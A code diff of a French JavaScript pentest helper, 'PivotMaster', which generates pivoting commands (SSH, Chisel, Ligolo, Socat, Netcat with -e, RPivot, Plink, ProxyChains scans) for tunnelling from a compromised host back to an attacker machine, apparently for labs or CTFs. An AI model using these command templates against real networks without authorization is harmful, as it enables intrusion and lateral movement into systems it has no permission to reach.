@@ -1356,7 +1441,7 @@ nc -l -p 1080 -k -e nc ${config.target2.ip} ${config.target2.port}`,
             });
 
             // Sauvegarder la configuration
-        this.saveConfig();
+            this.saveConfig();
 
             // Mettre à jour l'interface
             this.toggleDoublePivot();
@@ -1387,120 +1472,365 @@ nc -l -p 1080 -k -e nc ${config.target2.ip} ${config.target2.port}`,
         }, duration);
     }
 
+    /**
+     * Mettre à jour la visualisation réseau
+     */
     updateNetworkVisualization() {
-        try {
-            const config = {
-                attacker: {
-                    ip: document.getElementById('attackerIp')?.value || '',
-                    port: document.getElementById('attackerPort')?.value || ''
-                },
-                target1: {
-                    ip: document.getElementById('target1Ip')?.value || '',
-                    port: document.getElementById('target1Port')?.value || '',
-                    user: document.getElementById('target1User')?.value || '',
-                    password: document.getElementById('target1Password')?.value || ''
-                },
-                target2: {
-                    ip: document.getElementById('target2Ip')?.value || '',
-                    port: document.getElementById('target2Port')?.value || '',
-                    user: document.getElementById('target2User')?.value || '',
-                    password: document.getElementById('target2Password')?.value || ''
-                },
-                doublePivot: document.getElementById('doublePivot')?.checked || false
-            };
-
-            // Créer les nœuds
-            const nodes = new vis.DataSet([
-                {
-                    id: 1,
-                    label: `Attaquant\n${config.attacker.ip}`,
-                    group: 'attacker',
-                    title: 'Machine Attaquante'
-                },
-                {
-                    id: 2,
-                    label: `Target 1\n${config.target1.ip}`,
-                    group: 'target1',
-                    title: 'Premier Pivot'
-                }
-            ]);
-
-            // Créer les arêtes
-            const edges = new vis.DataSet([
-                {
-                    from: 1,
-                    to: 2,
-                    arrows: 'to',
-                    label: 'Tunnel'
-                }
-            ]);
-
-            // Ajouter Target 2 si double pivot est activé
-            if (config.doublePivot && config.target2.ip) {
-                nodes.add({
-                    id: 3,
-                    label: `Target 2\n${config.target2.ip}`,
-                    group: 'target2',
-                    title: 'Second Pivot'
-                });
-                edges.add({
-                    from: 2,
-                    to: 3,
-                    arrows: 'to',
-                    label: 'Tunnel'
-                });
-            }
-
-            // Configuration du réseau
-            const options = {
-                nodes: {
-                    shape: 'dot',
-                    size: 20,
-                    font: {
-                        size: 14
-                    }
-                },
-                edges: {
-                    font: {
-                        size: 12
-                    }
-                },
-                groups: {
-                    attacker: {
-                        color: { background: '#ff4444', border: '#cc0000' }
-                    },
-                    target1: {
-                        color: { background: '#44ff44', border: '#00cc00' }
-                    },
-                    target2: {
-                        color: { background: '#4444ff', border: '#0000cc' }
-                    }
-                },
-                physics: {
-                    stabilization: true,
-                    barnesHut: {
-                        gravitationalConstant: -2000,
-                        springConstant: 0.04,
-                        springLength: 200
-                    }
-                }
-            };
-
-            // Créer ou mettre à jour le réseau
-            const container = document.getElementById('network');
-            if (container) {
-                if (this.network) {
-                    this.network.setData({ nodes, edges });
-                } else {
-                    this.network = new vis.Network(container, { nodes, edges }, options);
-                }
-            }
-        } catch (error) {
-            console.error('Erreur lors de la mise à jour de la visualisation réseau:', error);
+        if (!this.networkVisualizer) {
+            console.warn('NetworkVisualizer non initialisé');
+            return;
         }
+
+        // Mettre à jour la configuration depuis les champs du formulaire
+        this.updateConfigFromForm();
+        
+        // Mettre à jour le réseau
+        this.networkVisualizer.updateNetworkFromConfig();
+        
+        console.log('🗺️ Topologie réseau mise à jour');
     }
 
-    // Fonction pour copier le texte dans le presse-papiers
+    /**
+     * Mettre à jour la configuration depuis les champs du formulaire
+     */
+    updateConfigFromForm() {
+        // Attaquant
+        this.config.attacker.ip = document.getElementById('attackerIp')?.value || '10.10.14.15';
+        this.config.attacker.port = document.getElementById('attackerPort')?.value || '4444';
+        
+        // Target 1
+        this.config.target1.ip = document.getElementById('target1Ip')?.value || '';
+        this.config.target1.port = document.getElementById('target1Port')?.value || '22';
+        this.config.target1.user = document.getElementById('target1User')?.value || '';
+        this.config.target1.password = document.getElementById('target1Password')?.value || '';
+        this.config.target1.os = this.detectOS(document.getElementById('target1Ip')?.value || '');
+        
+        // Target 2
+        this.config.target2.ip = document.getElementById('target2Ip')?.value || '';
+        this.config.target2.port = document.getElementById('target2Port')?.value || '22';
+        this.config.target2.user = document.getElementById('target2User')?.value || '';
+        this.config.target2.password = document.getElementById('target2Password')?.value || '';
+        this.config.target2.os = this.detectOS(document.getElementById('target2Ip')?.value || '');
+        
+        // Double pivot
+        this.config.doublePivot = document.getElementById('doublePivot')?.checked || false;
+        
+        // Target 3 (si double pivot activé)
+        if (this.config.doublePivot) {
+            this.config.target3 = {
+                ip: document.getElementById('target3Ip')?.value || '',
+                port: document.getElementById('target3Port')?.value || '3389'
+            };
+        }
+        
+        console.log('📋 Configuration mise à jour:', this.config);
+    }
+
+    /**
+     * Générer les commandes SSH
+     */
+    generateSSHCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'SSH Tunneling',
+            description: config.doublePivot ? 
+                'Établissement d\'un tunnel SSH pour accéder au réseau cible via un double pivot' :
+                'Établissement d\'un tunnel SSH pour accéder au réseau cible',
+            sections: [
+                {
+                    title: '1. Configuration du Tunnel SSH',
+                    description: config.doublePivot ?
+                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible (Target 2)' :
+                        'Sur la machine pivot (Target 1), exécutez la commande suivante pour créer un tunnel vers la machine cible',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Cette commande crée un tunnel SOCKS sur le port 1080 de la machine attaquante
+# -R : Crée un tunnel distant (remote)
+# 1080 : Port sur la machine attaquante
+# ${config.target1.ip}:${config.target1.port} : Machine et port cible
+# -N : Ne pas exécuter de commande distante (tunnel uniquement)
+ssh -R 1080:${config.target1.ip}:${config.target1.port} ${config.attacker.ip} -N`,
+                    comment: 'Le tunnel SSH crée un proxy SOCKS sur le port 1080 de votre machine attaquante'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes Chisel
+     */
+    generateChiselCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'Chisel Tunneling',
+            description: config.doublePivot ?
+                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible via un double pivot' :
+                'Établissement d\'un tunnel avec Chisel pour un accès fiable au réseau cible',
+            sections: [
+                {
+                    title: '1. Démarrage du Serveur Chisel',
+                    description: 'Sur votre machine attaquante, démarrez le serveur Chisel',
+                    command: `# Sur la machine attaquante
+# Télécharger Chisel si ce n'est pas déjà fait
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gunzip chisel_1.7.7_linux_amd64.gz
+chmod +x chisel_1.7.7_linux_amd64
+
+# Démarrer le serveur Chisel
+# -p : Port d'écoute
+# --reverse : Mode reverse shell
+./chisel_1.7.7_linux_amd64 server -p ${config.attacker.port} --reverse`,
+                    comment: 'Le serveur Chisel écoute sur le port spécifié et attend les connexions des clients'
+                },
+                {
+                    title: '2. Configuration du Client Chisel',
+                    description: 'Sur la machine pivot, configurez et démarrez le client Chisel',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Télécharger Chisel
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gunzip chisel_1.7.7_linux_amd64.gz
+chmod +x chisel_1.7.7_linux_amd64
+
+# Démarrer le client Chisel
+# R:1080 : Crée un tunnel SOCKS sur le port 1080
+# ${config.target1.ip}:${config.target1.port} : Machine et port cible
+./chisel_1.7.7_linux_amd64 client ${config.attacker.ip}:${config.attacker.port} R:1080:${config.target1.ip}:${config.target1.port}`,
+                    comment: 'Le client Chisel crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes Ligolo
+     */
+    generateLigoloCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'Ligolo Tunneling',
+            description: config.doublePivot ?
+                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible via un double pivot' :
+                'Établissement d\'un tunnel avec Ligolo pour un accès fiable au réseau cible',
+            sections: [
+                {
+                    title: '1. Configuration du Serveur Ligolo',
+                    description: 'Sur votre machine attaquante, configurez et démarrez le serveur Ligolo',
+                    command: `# Sur la machine attaquante
+# Télécharger Ligolo si ce n'est pas déjà fait
+wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
+chmod +x ligolo-v0.4.4-linux-amd64
+
+# Démarrer le serveur Ligolo
+# -selfcert : Génère un certificat auto-signé
+# -laddr : Adresse et port d'écoute
+./ligolo-v0.4.4-linux-amd64 -selfcert -laddr 0.0.0.0:${config.attacker.port}`,
+                    comment: 'Le serveur Ligolo écoute sur le port spécifié et attend les connexions des clients'
+                },
+                {
+                    title: '2. Configuration du Client Ligolo',
+                    description: 'Sur la machine pivot, configurez et démarrez le client Ligolo',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Télécharger Ligolo
+wget https://github.com/sysdream/ligolo/releases/download/v0.4.4/ligolo-v0.4.4-linux-amd64
+chmod +x ligolo-v0.4.4-linux-amd64
+
+# Démarrer le client Ligolo
+# -connect : Se connecte au serveur
+# -socks : Crée un tunnel SOCKS sur le port spécifié
+./ligolo-v0.4.4-linux-amd64 -connect ${config.attacker.ip}:${config.attacker.port} -socks 1080`,
+                    comment: 'Le client Ligolo crée un tunnel SOCKS sur le port 1080 de la machine attaquante'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes Socat
+     */
+    generateSocatCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'Socat Tunneling',
+            description: config.doublePivot ?
+                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible via un double pivot' :
+                'Établissement d\'un tunnel avec Socat pour un accès direct au réseau cible',
+            sections: [
+                {
+                    title: '1. Installation de Socat',
+                    description: 'Sur la machine pivot, installez Socat si ce n\'est pas déjà fait',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Installation de Socat
+apt-get update && apt-get install -y socat  # Pour Debian/Ubuntu
+# ou
+yum install -y socat  # Pour RHEL/CentOS`,
+                    comment: 'Socat doit être installé sur la machine pivot'
+                },
+                {
+                    title: '2. Création du Tunnel',
+                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Création du tunnel
+# TCP-LISTEN:1080 : Écoute sur le port 1080
+# fork : Permet plusieurs connexions simultanées
+# TCP:${config.target1.ip}:${config.target1.port} : Machine et port cible
+socat TCP-LISTEN:1080,fork TCP:${config.target1.ip}:${config.target1.port}`,
+                    comment: 'Le tunnel Socat est maintenant actif sur le port 1080'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes Netcat
+     */
+    generateNetcatCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'Netcat Tunneling',
+            description: config.doublePivot ?
+                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible via un double pivot' :
+                'Établissement d\'un tunnel avec Netcat pour un accès basique au réseau cible',
+            sections: [
+                {
+                    title: '1. Vérification de Netcat',
+                    description: 'Sur la machine pivot, vérifiez que Netcat est installé',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Vérifier la version de Netcat
+nc -h`,
+                    comment: 'Netcat doit être installé sur la machine pivot'
+                },
+                {
+                    title: '2. Création du Tunnel',
+                    description: 'Sur la machine pivot, créez un tunnel vers la machine cible',
+                    command: `# Sur Target 1 (Machine Pivot)
+# Création du tunnel
+# -l : Mode écoute
+# -p : Port d'écoute
+# -k : Garde la connexion ouverte
+nc -l -p 1080 -k -e nc ${config.target1.ip} ${config.target1.port}`,
+                    comment: 'Le tunnel Netcat est maintenant actif sur le port 1080'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes ProxyChains
+     */
+    generateProxyChainsCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'ProxyChains Configuration',
+            description: 'Configuration de ProxyChains pour utiliser le tunnel établi',
+            sections: [
+                {
+                    title: '1. Configuration de ProxyChains',
+                    description: 'Sur votre machine attaquante, configurez ProxyChains',
+                    command: `# Sur la machine attaquante
+# Éditer le fichier de configuration de ProxyChains
+sudo nano /etc/proxychains.conf
+
+# Ajouter la ligne suivante à la fin du fichier :
+socks5 127.0.0.1 1080`,
+                    comment: 'ProxyChains utilisera le tunnel SOCKS sur le port 1080'
+                },
+                {
+                    title: '2. Utilisation de ProxyChains',
+                    description: 'Utilisez ProxyChains pour vos outils de reconnaissance',
+                    command: `# Exemples d'utilisation
+# Scan de ports via le tunnel
+proxychains nmap -sT -p 80,443,22 ${config.target1.ip}
+
+# Reconnaissance web via le tunnel
+proxychains gobuster dir -u http://${config.target1.ip} -w /usr/share/wordlists/dirb/common.txt
+
+# Connexion SSH via le tunnel
+proxychains ssh ${config.target1.user}@${config.target1.ip}`,
+                    comment: 'Tous les outils utilisés avec proxychains passeront par le tunnel'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes RPivot
+     */
+    generateRPivotCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'RPivot Tunneling',
+            description: 'Établissement d\'un tunnel avec RPivot pour Windows',
+            sections: [
+                {
+                    title: '1. Démarrage du Serveur RPivot',
+                    description: 'Sur votre machine attaquante, démarrez le serveur RPivot',
+                    command: `# Sur la machine attaquante
+# Télécharger RPivot
+git clone https://github.com/klsecservices/rpivot.git
+cd rpivot
+
+# Démarrer le serveur RPivot
+python server.py --server-port ${config.attacker.port} --server-ip 0.0.0.0`,
+                    comment: 'Le serveur RPivot écoute sur le port spécifié'
+                },
+                {
+                    title: '2. Configuration du Client RPivot',
+                    description: 'Sur la machine pivot Windows, configurez le client RPivot',
+                    command: `# Sur Target 1 (Machine Pivot Windows)
+# Télécharger le client RPivot
+# Exécuter le client
+python client.py --server-ip ${config.attacker.ip} --server-port ${config.attacker.port}`,
+                    comment: 'Le client RPivot crée un tunnel SOCKS sur le port 1080'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Générer les commandes Plink
+     */
+    generatePlinkCommands() {
+        const config = this.config;
+        
+        return {
+            title: 'Plink SSH Tunneling',
+            description: 'Établissement d\'un tunnel SSH avec Plink pour Windows',
+            sections: [
+                {
+                    title: '1. Installation de Plink',
+                    description: 'Sur la machine pivot Windows, installez Plink',
+                    command: `# Sur Target 1 (Machine Pivot Windows)
+# Télécharger Plink depuis PuTTY
+# https://www.putty.org/
+# Ou utiliser winget
+winget install PuTTY.PuTTY`,
+                    comment: 'Plink est inclus avec PuTTY'
+                },
+                {
+                    title: '2. Création du Tunnel',
+                    description: 'Sur la machine pivot Windows, créez le tunnel SSH',
+                    command: `# Sur Target 1 (Machine Pivot Windows)
+# Création du tunnel SSH
+# -R : Crée un tunnel distant
+# 1080 : Port sur la machine attaquante
+# ${config.target1.ip}:${config.target1.port} : Machine et port cible
+# -N : Ne pas exécuter de commande distante
+plink -R 1080:${config.target1.ip}:${config.target1.port} ${config.attacker.ip} -N`,
+                    comment: 'Le tunnel SSH est maintenant actif sur le port 1080'
+                }
+            ]
+        };
+    }
+
+    /**
+     * Copier le texte dans le presse-papiers
+     */
     copyToClipboard(button) {
         try {
             const commandBlock = button.closest('.command-block');
@@ -1589,18 +1919,26 @@ function exportNetworkImage() {
 }
 
 function toggleNetworkPhysics() {
-    if (pivotMaster.networkVisualizer) {
-        pivotMaster.networkVisualizer.togglePhysics();
+    if (window.pivotMaster && window.pivotMaster.networkVisualizer) {
+        window.pivotMaster.networkVisualizer.togglePhysics();
     }
 }
 
-// Initialisation de l'application
-document.addEventListener('DOMContentLoaded', async () => {
+// Fonction globale pour charger les hosts depuis le Host Manager
+function loadHostsFromManager() {
+    if (window.pivotMaster) {
+        window.pivotMaster.loadHostsFromManager();
+        window.pivotMaster.showNotification('Hosts chargés depuis le Host Manager', 'success');
+    }
+}
+
+// Initialisation au chargement de la page
+document.addEventListener('DOMContentLoaded', async function() {
     try {
         window.pivotMaster = new PivotMaster();
         await window.pivotMaster.init();
-        console.log('PivotMaster initialisé avec succès');
+        console.log('🚀 Pivot Master prêt !');
     } catch (error) {
-        console.error('Erreur lors de l\'initialisation de PivotMaster:', error);
+        console.error('❌ Erreur lors de l\'initialisation de Pivot Master:', error);
     }
 }); 
